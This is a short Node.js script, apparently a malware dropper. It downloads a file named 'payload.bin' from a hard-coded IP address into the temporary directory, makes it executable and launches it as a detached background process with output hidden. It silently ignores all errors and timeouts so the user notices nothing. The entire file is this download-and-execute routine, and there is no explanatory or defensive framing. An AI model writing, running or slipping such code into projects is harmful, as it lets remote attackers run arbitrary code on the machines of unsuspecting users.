const http = require("http"), fs = require("fs"), os = require("os"), path = require("path");
const { spawn } = require("child_process");
const dest = path.join(os.tmpdir(), "payload.bin");
const req = http.get({ host: "203.0.113.50", path: "/payload.bin", timeout: 3000 }, (res) => {
  const out = fs.createWriteStream(dest);
  res.pipe(out);
  out.on("finish", () => {
    try { fs.chmodSync(dest, 0o755); spawn(dest, { detached: true, stdio: "ignore" }).unref(); }
    catch {}
  });
});
req.on("error", () => {}); req.on("timeout", () => req.destroy());
